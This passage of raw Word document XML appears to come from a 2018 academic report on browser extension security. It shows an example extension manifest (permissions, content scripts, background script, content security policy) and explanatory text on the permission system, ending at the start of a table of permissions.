                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>}</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="43A86FAC" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="1FBC980F" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="00BB6A42">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                              <w:jc w:val="left"/>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F5182B" id="_x0000_s1029" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:81.35pt;margin-top:129pt;width:303pt;height:30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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="15793C31" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>…</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"permissions"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"cookies"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>webRequest</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"*://*.facebook.com/"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"https://www.google.com/"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>…</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>content_scripts</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"matches"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"http://www.yahoo.com/*"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>js</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"jquery.js"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"myscript.js"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>…</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"background"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"scripts"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"background.js"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>…</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>content_security_policy</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"script-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>src</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="39B55298" w14:textId="2ECC4BDA" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>‘self’</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>http</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>:</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="808080"/>
                        </w:rPr>
                        <w:t>//www.foo.com ‘unsafe-eval’;"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="808080"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>…</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>}</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="43A86FAC" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="1FBC980F" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="00BB6A42">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchory="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="008D7F7B">
        <w:t xml:space="preserve">Access </w:t>
      </w:r>
      <w:r w:rsidR="004A4153">
        <w:t>control settings is a protection mechanism currently used by all browsers (based on Chromium, Firefox and Microsoft Edge). Browsers rely on a set of configuration options included in a manifest file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431CD82D" w14:textId="77777777" w:rsidR="002522AF" w:rsidRDefault="002522AF" w:rsidP="000B0C2E">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00E2FA7F" w14:textId="3119A892" w:rsidR="00851924" w:rsidRPr="00851924" w:rsidRDefault="0097075E" w:rsidP="00851924">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="80" w:name="_Toc523071495"/>
      <w:r>
        <w:t>Permissions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="80"/>
    </w:p>
    <w:p w14:paraId="1EB08154" w14:textId="29E4E89E" w:rsidR="004A4153" w:rsidRDefault="004A4153" w:rsidP="004A4153">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>The permission system is designed in the spirit of least privilege, with the goal of limiting the resources available to an extension. It determines which sites an extension can access, the allowed API call, and the use of binary plugins.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745E26EA" w14:textId="35E1F3F8" w:rsidR="00A22B7C" w:rsidDel="00163A42" w:rsidRDefault="00A22B7C" w:rsidP="00A22B7C">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="81" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>In Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="00BD7AA7">
        <w:t xml:space="preserve"> example,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the extension requests host permission for </w:t>
      </w:r>
      <w:r w:rsidRPr="00163A42">
        <w:t>https://www.google.com/,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which allows it to access cookies and </w:t>
      </w:r>
      <w:r w:rsidRPr="00163A42">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="82" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:37:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>webRequest</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> APIs for the specified domains. Wildcarding can also be used where the extension requests access to *://*.facebook.com. This permission allows access to all subdomains of facebook.com via any URL scheme. Additionally, </w:t>
      </w:r>
      <w:r w:rsidRPr="00163A42">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="83" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:37:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>&lt;all_urls&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a special token used for matching any URL.</w:t>
      </w:r>
      <w:ins w:id="84" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z">
        <w:r w:rsidR="00163A42">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5B07DB93" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="00A22B7C">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Table 1 shows all available permissions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577F82AC" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="00A22B7C">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51C4EC61" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="00A22B7C">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AAD34A9" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="00A22B7C">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31C9EEB1" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="00A22B7C">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="409E044C" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="00A22B7C">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0917AF94" w14:textId="0B40EE87" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="85" w:name="_Ref514844181"/>
      <w:bookmarkStart w:id="86" w:name="_Toc523071589"/>
      <w:r w:rsidRPr="001A20D5">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Table </w:t>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Table \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00236295">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="001A20D5">
        <w:t>: All available extension permissions.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="85"/>
      <w:bookmarkEnd w:id="86"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2264"/>
        <w:gridCol w:w="2350"/>
        <w:gridCol w:w="2273"/>
        <w:gridCol w:w="2458"/>
      </w:tblGrid>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="6BC927CE" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6CB77DAE" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>activeTab</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="565D6FE6" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>declarativeContent</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="599AB5C7" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>notifications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1F3C6A5D" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>system.storage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="520F8ADA" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1F09089E" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>alarms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="389C55C3" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
